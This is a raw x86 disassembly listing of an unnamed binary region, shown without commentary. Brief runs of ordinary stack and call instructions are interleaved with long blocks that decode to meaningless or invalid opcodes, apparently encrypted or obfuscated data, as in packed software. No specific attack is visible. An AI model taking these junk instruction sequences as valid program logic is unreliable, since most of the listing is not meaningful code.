  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x74]
  4111f1:	sbb    eax,0x7cee70a1
  4111f6:	sbb    BYTE PTR [eax],bl
  4111f8:	jno    0x41120e
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	scas   al,BYTE PTR es:[edi]
  4111fd:	dec    edi
  4111fe:	sub    dh,BYTE PTR [eax]
  411200:	into   
  411201:	pop    ds
  411202:	xlat   BYTE PTR ds:[ebx]
  411203:	stos   DWORD PTR es:[edi],eax
  411204:	dec    esp
  411205:	jae    0x4111d1
  411207:	mov    esp,0x3e69b0bc
  41120c:	jmp    0x152b:0x7ca9e247
  411213:	js     0x411226
  411215:	in     eax,0x74
  411217:	xor    al,0x64
  411219:	jecxz  0x41121e
  41121b:	add    eax,0x68e5b908
  411220:	(bad)  
  411221:	cmp    eax,0x69abc237
  411226:	xlat   BYTE PTR ds:[ebx]
  411227:	cwde   
  411228:	retf   
  411229:	lock adc esi,DWORD PTR [esi]
  41122c:	mov    edi,0x422c66b8
  411231:	cli    
  411232:	mov    ah,0x89
  411234:	xlat   BYTE PTR ds:[ebx]
  411235:	dec    ecx
  411236:	arpl   WORD PTR [esi],dx
  411238:	xor    esp,ecx
  41123a:	pop    es
  41123b:	popf   
  41123c:	xor    eax,0x6c35651
  411241:	sbb    al,0xb6
  411243:	jno    0x4112c0
  411245:	push   ebx
  411246:	adc    al,bl
  411248:	in     al,dx
  411249:	fild   WORD PTR [edi+0x58541fe6]
  41124f:	sub    DWORD PTR [esi+esi*8+0x16],0x54237652
  411257:	mov    DWORD PTR [ebp+0x7b8e3864],ebx
  41125d:	sub    BYTE PTR [edi+esi*1-0x3e],ah
  411261:	cmp    ah,cl
  411263:	jb     0x411242
  411265:	mov    dl,0x26
  411267:	and    edx,DWORD PTR [esi]
  411269:	je     0x4111f9
  41126b:	xor    DWORD PTR [ecx+0x7317f102],edx
  411271:	outs   dx,DWORD PTR ds:[esi]
  411272:	adc    dh,dl
  411274:	lods   al,BYTE PTR ds:[esi]
  411275:	sub    DWORD PTR [esi+0x9],0xffffffe2
  411279:	loop   0x411288
  41127b:	mov    al,cl
  41127d:	jg     0x4112a0
  41127f:	pushf  
  411280:	mov    esi,0xbabab288
  411285:	sti    
  411286:	sub    eax,0x9aee8c39
  41128b:	outs   dx,DWORD PTR ds:[esi]
  41128c:	cwde   
  41128d:	push   ds
  41128e:	lds    ebx,FWORD PTR [edi+ebp*2-0x206fa5df]
  411295:	out    0x3b,eax
  411297:	pop    ebp
  411298:	add    cl,BYTE PTR [ecx+edx*8]
  41129b:	jp     0x411257
  41129d:	icebp  
  41129e:	or     esi,0xffffff9f
  4112a1:	pop    esi
  4112a2:	retf   
  4112a3:	out    0xbd,al
  4112a5:	clc    
  4112a6:	lods   al,BYTE PTR ds:[esi]
  4112a7:	pop    edx
  4112a8:	call   ebx
  4112aa:	mov    WORD PTR [edx-0x8],es
  4112ad:	cmp    edx,esi
  4112af:	mov    cl,0x49
  4112b1:	int    0xf8
  4112b3:	aas    
  4112b4:	(bad)  
  4112b5:	mov    esi,0x5ebffd5e
  4112ba:	sub    al,0xb1
  4112bc:	and    cl,dh
  4112be:	inc    eax
  4112bf:	movaps XMMWORD PTR [edx],xmm1
  4112c2:	fwait
  4112c3:	pop    ds
  4112c4:	pop    ss
  4112c5:	retf   0xd14d
  4112c8:	rol    esi,0x6b
  4112cb:	mov    cs:0x796c6f4c,eax
  4112d1:	mov    eax,edx
  4112d3:	stos   BYTE PTR es:[edi],al
  4112d4:	mov    esi,0x80a693d
  4112d9:	sbb    DWORD PTR [edx+ebp*2],esp
  4112dc:	sub    bl,bl
  4112de:	dec    esp
  4112df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112e0:	aad    0x6e
  4112e2:	mov    WORD PTR [ebx-0x41],gs
  4112e5:	iret   
  4112e6:	jbe    0x41126f
  4112e8:	jmp    0x3ec9:0x52baf29a
  4112ef:	pop    eax
  4112f0:	into   
  4112f1:	inc    eax
  4112f2:	test   DWORD PTR [ecx-0x14],ebx
  4112f5:	xchg   edx,eax
  4112f6:	jns    0x41135a
  4112f8:	mov    esi,0xe0598788
  4112fd:	bound  edx,QWORD PTR [ebp-0x6]
  411300:	push   esi
  411301:	adc    al,BYTE PTR [edi-0x62]
  411304:	ret    0xc633
  411307:	and    BYTE PTR [esi-0x77],0x9e
  41130b:	mov    ah,0x1b
  41130d:	mov    ebx,0x839ce838
  411312:	dec    edx
  411313:	jp     0x41129a
  411315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411316:	scas   al,BYTE PTR es:[edi]
  411317:	in     eax,dx
  411318:	out    0x69,eax
  41131a:	sub    DWORD PTR [edi],edi
  41131c:	cmp    esp,DWORD PTR [eax-0x62]
  41131f:	fsub   DWORD PTR [ebx]
  411321:	(bad)  
  411322:	sbb    edi,edi
  411324:	sub    eax,0x20c4d7ee
  411329:	cli    
  41132a:	sti    
  41132b:	rcr    BYTE PTR [eax-0x436fa172],0xc7
  411332:	pop    edi
  411333:	add    cl,BYTE PTR [edx-0x7c]
  411336:	push   eax
  411337:	imul   DWORD PTR [edx]
  411339:	sbb    dh,cl
  41133b:	into   
  41133c:	fstp   TBYTE PTR [ecx-0x72]
  41133f:	cmovno ecx,DWORD PTR [eax+0x40]
  411343:	and    BYTE PTR [eax-0x16],0x52
  411347:	test   al,0x95
  411349:	inc    ebx
  41134a:	pop    ds
  41134b:	ja     0x411395
  41134d:	mov    edx,0x3384ba85
  411352:	and    edx,ebx
  411354:	inc    eax
  411355:	xor    al,0xd5
  411357:	mov    al,ds:0x6604eecb
  41135c:	jb     0x4112eb
  41135e:	mov    fs,WORD PTR [edi]
  411360:	retf   0xffa1
  411363:	xor    eax,0x61e131fb
  411368:	mov    edx,0xb56a2d74
  41136d:	out    0x84,eax
  41136f:	pop    es
  411370:	repz je 0x411308
  411373:	dec    ecx
  411374:	aaa    
  411375:	inc    edx
  411376:	lea    ecx,[eax+0x531d286c]
  41137c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41137d:	out    0x72,al
  41137f:	pop    ebx
  411380:	add    BYTE PTR [edx-0x4892bfa3],al
  411386:	mov    eax,ds:0x3a502558
  41138b:	mov    bl,bl
  41138d:	add    al,0xb2
  41138f:	mov    dl,0xd3
  411391:	or     esp,ecx
  411393:	(bad)  
  411394:	push   ebp
  411395:	lahf   
  411396:	jo     0x4113e8
  411398:	sub    dh,BYTE PTR [ebx+ebp*4]
  41139b:	retf   
  41139c:	pop    eax
  41139d:	call   0xecafa16b
  4113a2:	fdiv   DWORD PTR [esi+esi*8]
  4113a5:	dec    ecx
  4113a6:	sbb    BYTE PTR [ebx],bh
  4113a8:	adc    al,0x66
  4113aa:	loopne 0x411353
  4113ac:	stos   DWORD PTR es:[edi],eax
  4113ad:	mov    dh,0x16
  4113af:	test   eax,0xd26c81ce
  4113b4:	loop   0x41139d
  4113b6:	jl     0x41138b
  4113b8:	adc    dh,BYTE PTR [edx]
  4113ba:	jne    0x4113f7
  4113bc:	add    eax,0xd6b854cc
  4113c1:	sub    ch,0xd3
  4113c4:	or     al,BYTE PTR [esi]
  4113c6:	mov    dh,0xa5
  4113c8:	into   
  4113c9:	pop    ebp
  4113ca:	les    edi,FWORD PTR cs:[eax-0x1eaab8fb]
  4113d1:	les    edi,FWORD PTR [eax+0x5f42fe12]
  4113d7:	sub    eax,0x36
  4113da:	mov    ebp,0x201f66fe
  4113df:	mov    ds:0x4e1bcf59,eax
  4113e4:	mov    eax,ds:0xaf86cd22
  4113e9:	ret    
  4113ea:	dec    ebx
  4113eb:	hlt    
  4113ec:	mov    dh,0x1f
  4113ee:	les    edi,FWORD PTR [eax]
  4113f0:	pop    eax
  4113f1:	cmovbe eax,edi
  4113f4:	cmp    eax,DWORD PTR [esi+0x6ec6c8cb]
  4113fa:	out    dx,al
  4113fb:	je     0x41146f
  4113fd:	es pusha 
  4113ff:	add    ah,BYTE PTR [ebx+esi*2]
  411402:	data16 xor BYTE PTR [ecx+0x4d],al
  411406:	pushf  
  411407:	cmc    
  411408:	xchg   esi,eax
  411409:	ja     0x4113de
  41140b:	out    0xb,al
  41140d:	imul   edi,esi,0xffffff9d
  411410:	popf   
  411411:	mov    ebx,0x2a458f81
  411416:	pusha  
  411417:	aad    0x20
  411419:	mov    dl,0xe2
  41141b:	js     0x4113d0
  41141d:	fcomp  DWORD PTR [edi-0x4e94550a]
  411423:	mov    bh,0x81
  411425:	jbe    0x41149b
  411427:	sub    DWORD PTR [edi-0x17],edi
  41142a:	push   es
  41142b:	or     cl,BYTE PTR [eax+eiz*4]
  41142e:	inc    ecx
  41142f:	out    0xca,eax
  411431:	das    
  411432:	loopne 0x411437
  411434:	sbb    dh,BYTE PTR [esi+ebp*2+0x14]
  411438:	inc    ecx
  411439:	test   al,0x55
  41143b:	retf   0x7a17
  41143e:	scas   al,BYTE PTR es:[edi]
  41143f:	nop
  411440:	xor    eax,0x17535f9e
  411445:	push   ebp
  411446:	push   ss
  411447:	sbb    dh,ch
  411449:	(bad)  
  41144a:	push   edx
  41144b:	retf   0xb84b
  41144e:	xor    al,0x1d
  411450:	aad    0xb8
  411452:	es mov edi,0xff5085c7
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x2f7e2188]
  4114b5:	test   eax,0x7847bcd3
  4114ba:	sbb    BYTE PTR [eax],bl
  4114bc:	jno    0x4114d2
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	sub    DWORD PTR [ebx],ebx
  4114c2:	add    eax,0xeedd34e1
  4114c7:	(bad)  
  4114c8:	dec    ebx
  4114c9:	mov    ah,0xb4
  4114cb:	pushf  
  4114cc:	cmp    DWORD PTR [ecx],edx
  4114ce:	rcl    DWORD PTR [esi+edx*2-0x40],1
  4114d2:	sbb    BYTE PTR [esi-0x3],al
  4114d5:	mov    eax,0x93f54685
  4114da:	mov    cl,0x3c
  4114dc:	dec    ecx
  4114dd:	mov    bl,0x77
  4114df:	xchg   ebp,eax
  4114e0:	out    0x3,al
  4114e2:	add    al,0x74
  4114e4:	outs   dx,BYTE PTR ds:[esi]
  4114e5:	xor    DWORD PTR [esp+ebp*1+0x478cf56],edi
  4114ec:	push   cs
  4114ed:	mov    ah,0x80
  4114ef:	daa    
  4114f0:	mov    cl,0x6a
  4114f2:	and    ah,BYTE PTR [edi]
  4114f4:	adc    eax,0x6cbd565
  4114f9:	(bad)  [edi]
  4114fb:	and    DWORD PTR [eax+eiz*1+0x6d76f0c8],ebp
  411502:	into   
  411503:	sar    BYTE PTR [edx+0x30],1
  411506:	push   ss
  411507:	(bad)  
  411508:	aam    0x3f
  41150a:	mov    edi,0xf349548a
  41150f:	mov    bl,0xcc
  411511:	gs scas al,BYTE PTR es:[edi]
  411513:	mov    ebx,0xff1a29c3
  411518:	shr    DWORD PTR [ecx],1
  41151a:	and    BYTE PTR [ecx-0x1880876],bh
  411520:	cmp    esi,eax
  411522:	push   edx
  411523:	mov    cs,WORD PTR [ebx+edx*8+0x35ff1558]
  41152a:	hlt    
  41152b:	cld    
  41152c:	mov    ebp,0xb4b0626c
  411531:	lahf   
  411532:	(bad)
  411535:	fcomp  QWORD PTR [edi-0x43558795]
  41153b:	sti    
  41153c:	dec    esi
  41153d:	mov    ds:0x601aac49,al
  411542:	push   eax
  411544:	mov    DWORD PTR [esi-0x5d19e918],ebx
  41154a:	xchg   esi,eax
  41154b:	gs ret 0xf57c
  41154f:	or     cl,cl
  411551:	loop   0x411573
  411553:	iret   
  411554:	mov    DWORD PTR [esi],ecx
  411556:	add    eax,0x3f6f18d3
  41155b:	dec    edx
  41155c:	push   0xf6bb3c92
  411561:	mov    eax,ds:0xc8528cdb
  411567:	add    esp,ebx
  411569:	push   ecx
  41156a:	cdq    
  41156b:	and    esp,ecx
  41156d:	xor    DWORD PTR [edx-0x3f],esp
  411570:	lds    ecx,FWORD PTR ds:[ebp-0x66]
  411574:	cs cld 
  411576:	sbb    DWORD PTR [eax+ebp*2],ebp
  411579:	(bad)  
  41157a:	cli    
  41157b:	pop    edi
  41157c:	and    eax,0xbbe91d78
  411581:	ins    DWORD PTR es:[edi],dx
  411582:	test   DWORD PTR [edi-0x10],esi
  411585:	rcr    BYTE PTR [ecx+ebx*2-0x34],0x62
  41158a:	mov    eax,ebx
  41158c:	pop    eax
  41158d:	rcl    BYTE PTR [edi+0x4ec2667c],0xb2
  411594:	xor    BYTE PTR [eax],bh
  411596:	leave  
  411597:	inc    ebp
  411598:	dec    ecx
  411599:	(bad)  
  41159a:	push   ebx
  41159b:	shr    esp,0x2a
  41159e:	mov    al,0x6e
  4115a0:	add    ebp,esp
  4115a2:	imul   esp,DWORD PTR [ecx-0x1],0x5378e7a4
  4115a9:	int    0x1d
  4115ab:	jle    0x41161c
  4115ad:	push   0xa5181e82
  4115b2:	ins    BYTE PTR es:[edi],dx
  4115b3:	(bad)  
  4115b5:	hlt    
  4115b6:	dec    edi
  4115b7:	jg     0x411575
  4115b9:	cmp    eax,0xea833173
  4115be:	fisub  DWORD PTR [edx-0x2c]
  4115c1:	dec    esi
  4115c2:	adc    ecx,DWORD PTR [ebx]
  4115c4:	jp     0x411548
  4115c6:	and    eax,0x7626edd7
  4115cb:	scas   al,BYTE PTR es:[edi]
  4115cc:	fsub   st,st(7)
  4115ce:	push   ss
  4115cf:	jecxz  0x4115bf
  4115d1:	mov    ah,0xb0
  4115d3:	xchg   edi,eax
  4115d4:	push   ebx
  4115d5:	stc    
  4115d6:	les    esp,FWORD PTR ss:[bp+di-0x1f7d]
  4115dc:	cdq    
  4115dd:	call   0x815c197
  4115e2:	mov    ecx,0x76d30b3f
  4115e7:	scas   eax,DWORD PTR es:[edi]
  4115e8:	pop    edi
  4115e9:	mov    edi,0x505a173c
  4115ee:	mov    edi,0x30176aab
  4115f4:	ror    bh,0x54
  4115f7:	push   ebp
  4115f8:	jo     0x4115f0
  4115fa:	push   edx
  4115fb:	jo     0x41159b
  4115fd:	in     eax,dx
  4115fe:	sbb    al,0x94
  411600:	clc    
  411601:	iret   
  411602:	test   eax,0xd1106bf8
  411607:	enter  0x9ab6,0x2f
  41160b:	xor    ecx,ecx
  41160d:	jae    0x4115f6
  41160f:	dec    ebp
  411610:	pop    es
  411611:	dec    ebp
  411612:	and    BYTE PTR [esi-0x63b95a23],0x5e
  411619:	jns    0x41164c
  41161b:	dec    edx
  41161c:	dec    edi
  41161d:	fdiv   DWORD PTR [esi+edx*4]
  411620:	xor    eax,0xf0a1ad2c
  411625:	in     eax,dx
  411626:	jno    0x411676
  411628:	loope  0x4115b3
  41162a:	cwde   
  41162b:	cmp    al,BYTE PTR [edi+esi*4]
  41162e:	and    cl,BYTE PTR cs:[edi]
  411631:	fcom   DWORD PTR [esi*2+0x25cf4606]
  411638:	into   
  411639:	push   es
  41163a:	lock push ecx
  41163c:	fwait
  41163d:	pop    ecx
  41163e:	mov    esp,0x4a3d92cb
  411643:	retf   0xd5aa
  411646:	add    ch,ah
  411648:	clc    
  411649:	mov    edi,0xb834d75a
  41164e:	fwait
  41164f:	jp     0x411608
  411651:	xchg   ebp,eax
  411652:	jo     0x4116bc
  411654:	aam    0x43
  411656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411657:	test   DWORD PTR [edx],ebp
  411659:	pushf  
  41165a:	shl    BYTE PTR [edx-0x3af7755b],1
  411660:	cs js  0x411688
  411663:	dec    esp
  411664:	xor    eax,0x10ad4121
  411669:	repz sbb esp,DWORD PTR [edx]
  41166c:	cmp    DWORD PTR [ebx-0x2a6d0ec9],0x43
  411673:	js     0x411635
  411675:	add    esp,DWORD PTR [ecx]
  411677:	mov    eax,0x8a30acf0
  41167c:	xor    al,0xa0
  41167e:	inc    edi
  41167f:	dec    edx
  411680:	jae    0x411692
  411682:	mov    al,ds:0x4f20cb67
  411687:	jl     0x411677
  411689:	je     0x4116fa
  41168b:	pushf  
  41168c:	fs stos DWORD PTR es:[edi],eax
  41168e:	cld    
  41168f:	inc    esp
  411690:	push   esi
  411691:	pop    ss
  411692:	and    al,BYTE PTR [ebx-0x4c]
  411695:	mov    bh,0x27
  411697:	jo     0x4116fb
  411699:	lea    ecx,ds:0x97e8078a
  41169f:	mov    ds:0x59ca9d28,al
  4116a4:	or     ebx,DWORD PTR [ecx]
  4116a6:	xchg   esi,eax
  4116a7:	push   ecx
  4116a8:	cld    
  4116a9:	fs (bad) 
  4116ab:	in     al,dx
  4116ac:	daa    
  4116ad:	jle    0x4116d9
  4116af:	pop    ebp
  4116b0:	retf   0xfda8
  4116b3:	push   es
  4116b4:	jp     0x411672
  4116b6:	mov    ds:0x46a84759,al
  4116bb:	(bad)  
  4116bc:	(bad)  
  4116bd:	stos   BYTE PTR es:[edi],al
  4116be:	shl    dl,0x1d
  4116c1:	stc    
  4116c2:	mov    ebx,ebx
  4116c4:	cmc    
  4116c5:	fdivr  st(0),st
  4116c7:	pop    esp
  4116c8:	dec    esp
  4116c9:	dec    eax
  4116ca:	nop
  4116cb:	int    0x3d
  4116cd:	mov    bh,0xdb
  4116cf:	pop    edx
  4116d0:	call   0xb73a5d63
  4116d5:	xchg   DWORD PTR [esi+0xa],edi
  4116d8:	loopne 0x4116d2
  4116da:	sub    dh,cl
  4116dc:	sbb    esp,edx
  4116de:	adc    ebx,ecx
  4116e0:	out    dx,al
  4116e1:	pop    es
  4116e2:	push   esi
  4116e3:	dec    esp
  4116e5:	xchg   ebx,eax
  4116e6:	push   0x99c23d93
  4116eb:	cmp    BYTE PTR [ebx+esi*4-0x2f],al
  4116ef:	and    bl,BYTE PTR [ecx+0x7f]
  4116f2:	call   0xf12309f6
  4116f7:	arpl   WORD PTR [ebp-0x48ca026a],bp
  4116fd:	jbe    0x4116d3
  4116ff:	outs   dx,BYTE PTR ds:[esi]
  411700:	loop   0x41168a
  411702:	jl     0x4116ad
  411704:	arpl   WORD PTR [esi+ecx*1+0x4e1a1c1a],ax
  41170b:	inc    edx
  41170c:	mov    ebp,0x9b869a3b
  411711:	pusha  
  411712:	add    esp,DWORD PTR [eax+0x283b091f]
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x5f79aa57
  411755:	outs   dx,DWORD PTR ds:[esi]
  411756:	mov    al,0x9e
  411758:	je     0x411772
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	inc    eax
  411760:	inc    edx
  411761:	jae    0x411792
  411763:	ins    DWORD PTR es:[edi],dx
  411764:	(bad)  
  411765:	mov    ecx,0x2533a2e4
  41176a:	js     0x4117de
  41176c:	sub    BYTE PTR [eax-0x6777ffd8],dh
  411772:	out    0x28,eax
  411774:	not    BYTE PTR [ebp+0x51ceca0]
  41177a:	and    eax,DWORD PTR [edx-0x4c413363]
  411780:	mov    ecx,0x63246acf
  411785:	jg     0x41174e
  411787:	pop    eax
  411788:	shr    BYTE PTR [ecx-0x6079ac0],0xe8
  41178f:	pop    ecx
  411790:	sbb    BYTE PTR [ecx-0x1d0db473],bl
  411796:	dec    eax
  411797:	push   edx
  411798:	cmc    
  411799:	rcl    BYTE PTR [ecx-0x54],cl
  41179c:	mov    ch,0xd4
  41179e:	repz mov bh,0x46
  4117a1:	add    eax,0x8ca62a97
  4117a6:	pushf  
  4117a7:	xchg   ebx,eax
  4117a8:	add    eax,0x8dad98f
  4117ad:	aaa    
  4117ae:	dec    esi
  4117af:	ficom  WORD PTR [eax+eax*8-0x67ce3bdc]
  4117b6:	sar    BYTE PTR [eax-0x7d92c6a0],cl
  4117bc:	stos   BYTE PTR es:[edi],al
  4117bd:	and    al,0x7d
  4117bf:	fdiv   DWORD PTR [ebx+0x71a239b4]
  4117c5:	pop    es
  4117c6:	outs   dx,DWORD PTR ds:[esi]
  4117c7:	retf   
  4117c8:	shr    BYTE PTR [edx-0x37ebe566],1
  4117ce:	dec    esi
  4117cf:	cmp    bl,BYTE PTR [ebx+eax*1+0x3]
  4117d3:	adc    bh,bh
  4117d5:	cmp    BYTE PTR [ebx+0x3],bh
  4117d8:	sub    ebx,eax
  4117da:	iret   
  4117db:	add    esp,edi
  4117dd:	push   es
  4117de:	test   BYTE PTR [eax+0x8],cl
  4117e1:	inc    esi
  4117e2:	mov    ah,0x6c
  4117e4:	or     al,0x3a
  4117e6:	bound  eax,QWORD PTR [edx+0x9]
  4117e9:	mov    edx,0x6ce238d7
  4117ee:	pop    ss
  4117ef:	test   al,0xe4
  4117f1:	neg    DWORD PTR [ecx]
  4117f3:	outs   dx,DWORD PTR ds:[esi]
  4117f4:	(bad)  
  4117f5:	call   0xe4ffbac6
  4117fa:	icebp  
  4117fb:	scas   eax,DWORD PTR es:[edi]
  4117fc:	in     eax,0x68
  4117fe:	mov    esi,DWORD PTR [edx]
  411800:	mov    dh,0x9e
  411802:	xor    DWORD PTR es:[edi],eax
  411805:	data16 xchg BYTE PTR [edi-0xf],bl
  411809:	popf   
  41180a:	mov    bl,0x4a
  41180c:	dec    edx
  41180d:	fcomp  QWORD PTR [ebx+0x48596c2f]
  411813:	inc    ebx
  411814:	or     ecx,esi
  411816:	les    edx,FWORD PTR [ebp+0x1c782310]
  41181c:	pushf  
  41181d:	lahf   
  41181e:	add    eax,0x786c0586
  411823:	xor    al,0x5b
  411825:	lock sub eax,0x18db1f31
  41182b:	mov    edi,0xbf8e6a21
  411830:	sahf   
  411831:	stc    
  411832:	leave  
  411833:	test   DWORD PTR [edi-0xe22e520],esi
  411839:	xchg   ecx,eax
  41183a:	inc    ecx
  41183b:	cmp    bl,cl
  41183d:	adc    al,0x2f
  41183f:	push   0xbd55ccd8
  411844:	jmp    0xc9209c7e
  411849:	test   BYTE PTR [ecx+0x1c75f872],al
  41184f:	std    
  411850:	sub    eax,0xde67d94
  411855:	sub    edi,DWORD PTR [edi]
  411857:	shl    BYTE PTR [ecx-0x278e558d],1
  41185d:	and    BYTE PTR [edx],0x88
  411860:	fisub  WORD PTR ds:0x7a574940
  411866:	mov    ebp,0xbf0e34b2
  41186b:	adc    al,0x10
  41186d:	add    DWORD PTR [eax],eax
  41186f:	and    eax,0xc4b96e41
  411874:	sub    al,0x4d
  411876:	jle    0x4118ac
  411878:	mov    eax,0x49fea51
  41187d:	ds je  0x41184d
  411880:	icebp  
  411881:	adc    cl,ch
  411883:	dec    ecx
  411884:	inc    ebx
  411885:	je     0x4118a7
  411887:	xor    BYTE PTR [edi],cl
  411889:	xor    eax,0x61018fb4
  41188e:	lea    edi,[ecx]
  411890:	push   esp
  411891:	fidivr WORD PTR [esi-0x1d1f7380]
  411897:	shl    BYTE PTR [edi+0x42],0x3b
  41189b:	jno    0x411824
  41189d:	mov    ss,edx
  41189f:	fucom  st(0)
  4118a1:	mov    al,0x3a
  4118a3:	inc    esp
  4118a4:	mov    ecx,0x8a3ebaa5
  4118a9:	push   ecx
  4118aa:	fadd   QWORD PTR [ecx]
  4118ac:	mov    bl,0x3d
  4118ae:	or     esi,ecx
  4118b0:	push   0xd62aece4
  4118b5:	push   0x26
  4118b7:	or     BYTE PTR [eax],cl
  4118b9:	in     al,0xc5
  4118bb:	xchg   BYTE PTR [ebp-0x54],dh
  4118be:	and    bl,BYTE PTR [eax+0x67a6886f]
  4118c4:	push   esp
  4118c5:	xor    ch,BYTE PTR ds:0xfe92b022
  4118cb:	mov    dl,0x5b
  4118cd:	mov    dl,0x42
  4118cf:	xchg   ebp,eax
  4118d0:	add    DWORD PTR [ecx],ebp
  4118d2:	retf   
  4118d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d4:	mov    al,0x43
  4118d6:	sub    eax,edi
  4118d8:	push   edi
  4118d9:	cmp    DWORD PTR [ecx],esi
  4118db:	xor    edx,DWORD PTR [ecx-0x1ff94c7]
  4118e1:	retf   
  4118e2:	loop   0x411870
  4118e4:	jae    0x411904
  4118e6:	(bad)  
  4118e7:	leave  
  4118e8:	scas   eax,DWORD PTR es:[edi]
  4118e9:	stos   BYTE PTR es:[edi],al
  4118ea:	stc    
  4118eb:	dec    ebx
  4118ec:	in     al,dx
  4118ed:	fisttp WORD PTR [ecx-0x70]
  4118f0:	das    
  4118f1:	adc    ah,BYTE PTR [edi+0x4f972134]
  4118f7:	fistp  QWORD PTR [eax]
  4118f9:	inc    edi
  4118fa:	push   edx
  4118fb:	pop    edi
  4118fc:	aad    0x3f
  4118fe:	call   0x15df4917
  411903:	(bad)  
  411904:	push   ebp
  411905:	shr    BYTE PTR [ebp-0x69],1
  411908:	push   esi
  411909:	xor    bh,ch
  41190b:	add    al,0x8e
  41190d:	push   ebp
  41190e:	push   edi
  41190f:	test   BYTE PTR [edi-0x5d],ah
  411912:	add    eax,0x8c00790
  411917:	mov    bh,0xa5
  411919:	lds    ebx,FWORD PTR [esi]
  41191b:	pop    ebx
  41191c:	inc    esi
  41191d:	sub    dh,BYTE PTR [eax+ecx*4-0x36a68443]
  411924:	loope  0x4118c3
  411926:	inc    esp
  411927:	(bad)  
  411928:	aad    0xab
  41192a:	add    DWORD PTR [edi+0x42],ebp
  41192d:	jecxz  0x411961
  41192f:	pop    edi
  411930:	pushf  
  411931:	imul   ebx,DWORD PTR [ecx],0xa3347c08
  411937:	sbb    al,BYTE PTR [esi]
  411939:	(bad)
  41193c:	xchg   edx,eax
  41193d:	push   0xaab10b13
  411942:	xchg   edx,eax
  411943:	icebp  
  411944:	data16 fwait
  411946:	adc    eax,esp
  411948:	mov    ebx,0x1a10eea7
  41194d:	icebp  
  41194e:	aad    0x1e
  411950:	cld    
  411951:	leave  
  411952:	int    0x52
  411954:	mov    al,ds:0xed36bd76
  411959:	sub    ebx,esp
  41195b:	out    0x76,al
  41195d:	mov    eax,0x2447bd16
  411962:	in     al,0x5a
  411964:	pusha  
  411965:	mov    ss,WORD PTR [esi-0x218f20a2]
  41196b:	aaa    
  41196c:	aam    0x58
  41196e:	aaa    
  41196f:	das    
  411970:	sbb    DWORD PTR [esi],eax
  411972:	addr16 pusha 
  411974:	mov    WORD PTR [eax],?
  411976:	lock in eax,0x47
  411979:	iret   
  41197a:	or     DWORD PTR [edi+0x5f4b553a],esp
  411980:	dec    edi
  411981:	faddp  st(4),st
  411983:	jg     0x41195e
  411985:	or     al,0x1b
  411987:	xlat   BYTE PTR ds:[ebx]
  411988:	or     eax,0x3b9c1288
  41198d:	hlt    
  41198e:	popf   
  41198f:	add    edx,DWORD PTR [edi-0x102c261a]
  411995:	xor    ebx,DWORD PTR [ebp-0x65]
  411998:	out    dx,al
  411999:	push   edx
  41199a:	not    esp
  41199c:	add    bl,BYTE PTR [esp+edi*2]
  41199f:	ret    0xb816
  4119a2:	(bad)  
  4119a3:	adc    al,0xd9
  4119a5:	add    BYTE PTR [edx-0x5f7fa419],bh
  4119ab:	xchg   BYTE PTR [ebp+0x2e],ah
  4119ae:	loope  0x41197a
  4119b0:	dec    esi
  4119b1:	pop    ss
  4119b2:	call   DWORD PTR [eax+ecx*2+0x3b]
  4119b6:	sbb    ecx,DWORD PTR [ebx-0xe7e3bab]
  4119bc:	cmp    cl,BYTE PTR [edi]
  4119be:	add    BYTE PTR [eax],al
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422558
